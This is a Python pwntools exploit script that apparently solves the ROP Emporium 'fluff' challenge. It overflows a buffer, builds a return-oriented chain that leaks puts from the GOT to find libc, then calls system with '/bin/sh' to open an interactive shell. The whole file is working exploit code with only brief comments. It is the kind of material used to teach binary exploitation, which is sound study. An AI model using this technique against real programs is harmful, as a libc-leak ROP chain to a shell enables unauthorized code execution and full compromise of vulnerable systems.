from pwn import *
context.arch = 'amd64'

p = process('./fluff', level="debug")
elf = ELF("./fluff")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

puts_plt = p64(elf.plt["puts"])
main_addr = p64(0x400746)

puts_got = p64(0x601018)

gdb.attach(p, 
gdbscript= 
'''b*0x400806
c
''')

binsh_off = 0x1b75aa
puts_off = 0x875a0

system = p64(0x0000000000400810)

# gadgets
pop_rdi = p64(0x00000000004008c3)

# payload part 1
buf = 'a'*0x20 + 'b'*0x8
payload = buf
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main_addr

p.recvuntil("to rewrite my solutions...\n> ")
p.clean()
p.sendline(payload)

# libc leak
s = p.recvline().strip()
leak = u64(s.ljust(8, "\x00"))

info("leaked libc address: %s" %hex(leak))

# libc addresses
libc_base = leak - puts_off
binsh_addr = libc_base + binsh_off

info("/bin/sh address: %s"%hex(binsh_addr))

# payload part 2
payload = buf
payload += pop_rdi
payload += p64(binsh_addr)
payload += system

p.clean()
p.sendline(payload)

#info(s)

payload += system

p.interactive()
